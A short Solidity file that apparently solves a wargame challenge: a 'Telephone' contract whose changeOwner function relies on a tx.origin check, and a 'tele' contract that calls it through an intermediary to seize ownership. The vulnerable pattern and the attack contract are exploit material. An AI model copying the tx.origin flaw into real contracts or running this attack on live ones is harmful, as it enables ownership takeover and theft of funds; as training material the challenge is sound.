// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
contract tele{
    Telephone addr;

    constructor(address _addr) public {
        addr=Telephone(_addr);
        }
        function set (address _add) public{
      addr.changeOwner(_add);}
  }